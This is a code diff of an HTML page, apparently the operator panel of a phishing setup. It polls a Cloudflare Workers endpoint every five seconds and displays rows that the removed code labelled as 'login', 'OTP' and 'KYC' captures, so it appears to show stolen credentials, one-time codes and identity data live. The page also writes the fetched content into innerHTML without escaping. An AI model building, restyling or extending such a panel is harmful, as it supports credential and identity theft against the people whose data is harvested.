@@ -2,131 +2,101 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flat-Fog Admin Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Admin Live</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
-        body { background-color: #f4f7f6; padding: 20px; }
+        body { background-color: #000; color: #fff; padding: 10px; }
         
-        .top-bar { 
-            background: #1a237e; color: white; padding: 15px; 
-            text-align: center; border-radius: 10px; margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        .top-header { 
+            background: #cd0000; color: white; padding: 12px; 
+            text-align: center; border-radius: 5px; margin-bottom: 15px;
+            font-weight: bold; letter-spacing: 2px; text-transform: uppercase;
         }
         
-        .status-info { 
-            text-align: center; margin-bottom: 15px; font-size: 13px; color: #666; 
+        .live-indicator {
+            display: inline-block; width: 10px; height: 10px;
+            background: #fff; border-radius: 50%; margin-right: 8px;
+            animation: blink 1s infinite;
         }
-        #sync-status { font-weight: bold; color: #1a237e; }
 
-        #log-grid { 
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); 
-            gap: 15px; max-width: 1200px; margin: 0 auto; 
-        }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        #log-container { display: flex; flex-direction: column; gap: 10px; }
 
         .log-card {
-            background: white; border-radius: 8px; border-top: 5px solid #1a237e;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow: hidden;
-            transition: 0.3s;
+            background: #111; border: 1px solid #333; border-left: 4px solid #cd0000;
+            border-radius: 4px; overflow: hidden;
         }
-        .log-card:hover { transform: translateY(-3px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
 
-        .card-head { 
-            padding: 10px 15px; background: #fafafa; border-bottom: 1px solid #eee;
+        .card-header { 
+            padding: 8px 12px; background: #1a1a1a; border-bottom: 1px solid #222;
             display: flex; justify-content: space-between; align-items: center;
         }
 
         .badge { 
-            padding: 3px 10px; border-radius: 15px; font-size: 10px; 
-            font-weight: bold; color: white; text-transform: uppercase; 
+            padding: 2px 8px; border-radius: 3px; font-size: 11px; 
+            font-weight: bold; color: #fff; background: #cd0000;
         }
-        /* Table Colors */
-        .badge-login { background: #2196F3; }
-        .badge-otp { background: #f44336; }
-        .badge-kyc { background: #FF9800; }
         
-        .log-time { font-size: 11px; color: #aaa; }
+        .time { font-size: 10px; color: #888; }
         
-        .card-body { padding: 15px; }
-        .data-content { 
-            background: #f9f9f9; border: 1px dashed #ddd; 
-            padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace;
-            font-size: 14px; line-height: 1.6; white-space: pre-wrap;
+        .card-body { padding: 12px; }
+        .data-box { 
+            color: #ff4d4d; font-family: monospace;
+            font-size: 14px; line-height: 1.5; white-space: pre-wrap;
         }
 
-        .empty-msg { text-align: center; grid-column: 1 / -1; padding: 50px; color: #999; }
+        .empty { text-align: center; padding: 50px; color: #444; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <h2>SKY DB ADMIN PANEL</h2>
-        <small>Worker: flat-fog-a0cd</small>
+    <div class="top-header">
+        <span class="live-indicator"></span>LIVE MONITOR
     </div>
 
-    <div class="status-info">
-        Status: <span id="sync-status">Connecting to Sky...</span> | 
-        Auto-Refresh: 5s | <span id="timer">--:--:--</span>
-    </div>
-
-    <div id="log-grid">
-        <div class="empty-msg">Fetching latest logs...</div>
+    <div id="log-container">
+        <div class="empty">NO DATA FOUND</div>
     </div>
 
     <script>
-        // AAPKA WORKER URL
         const WORKER_URL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function refreshLogs() {
+        async function fetchLogs() {
             try {
                 const response = await fetch(WORKER_URL);
                 const results = await response.json();
-                
-                const grid = document.getElementById('log-grid');
-                const status = document.getElementById('sync-status');
-                document.getElementById('timer').innerText = new Date().toLocaleTimeString();
+                const container = document.getElementById('log-container');
 
                 if (!results || results.length === 0) {
-                    grid.innerHTML = '<div class="empty-msg">Abhi tak koi data nahi aaya hai (Database Empty).</div>';
-                    status.innerText = "Connected (Empty)";
+                    container.innerHTML = '<div class="empty">NO DATA FOUND</div>';
                     return;
                 }
 
-                let cardsHtml = '';
+                let html = '';
                 results.forEach(row => {
-                    const bClass = `badge-${row.type.toLowerCase()}`;
-                    // '|' separator ko line break se replace karna taaki sundar dikhe
                     const cleanContent = row.content.replace(/ \| /g, '\n');
-
-                    cardsHtml += `
+                    html += `
                         <div class="log-card">
-                            <div class="card-head">
-                                <span class="badge ${bClass}">${row.type}</span>
-                                <span class="log-time">${row.time}</span>
+                            <div class="card-header">
+                                <span class="badge">${row.type}</span>
+                                <span class="time">${row.time}</span>
                             </div>
                             <div class="card-body">
-                                <div class="data-content">${cleanContent}</div>
+                                <div class="data-box">${cleanContent}</div>
                             </div>
                         </div>
                     `;
                 });
-
-                grid.innerHTML = cardsHtml;
-                status.innerText = "Live / Connected";
-                status.style.color = "#4CAF50";
-
+                container.innerHTML = html;
             } catch (err) {
-                console.error("Fetch Error:", err);
-                document.getElementById('sync-status').innerText = "Connection Failed!";
-                document.getElementById('sync-status').style.color = "red";
+                document.getElementById('log-container').innerHTML = '<div class="empty">CONNECTION ERROR</div>';
             }
         }
 
-        // Initial Load
-        refreshLogs();
-
-        // Har 5 second mein refresh
-        setInterval(refreshLogs, 5000);
+        fetchLogs();
+        setInterval(fetchLogs, 5000);
     </script>
 </body>
 </html>
